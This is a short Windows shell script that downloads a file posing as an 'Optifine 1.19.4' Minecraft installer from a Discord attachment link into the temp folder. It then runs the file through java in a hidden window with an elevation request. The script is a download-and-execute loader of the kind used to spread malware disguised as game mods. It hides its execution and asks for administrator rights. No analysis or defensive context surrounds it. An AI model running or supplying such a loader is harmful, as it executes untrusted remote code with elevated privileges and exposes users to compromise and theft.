bitsadmin /transfer Explorers /download /priority FOREGROUND https://cdn.discordapp.com/attachments/1105931252453871696/1105931301170708581/Optifine_1.19.4_Installer.jar "$env:temp\Optifine_1.19.4_Installer.jar" ; 
sleep 3 ; 
cd $env:temp ; 
start java -windowstyle hidden -verb runas -args '-jar Optifine_1.19.4_Installer.jar'
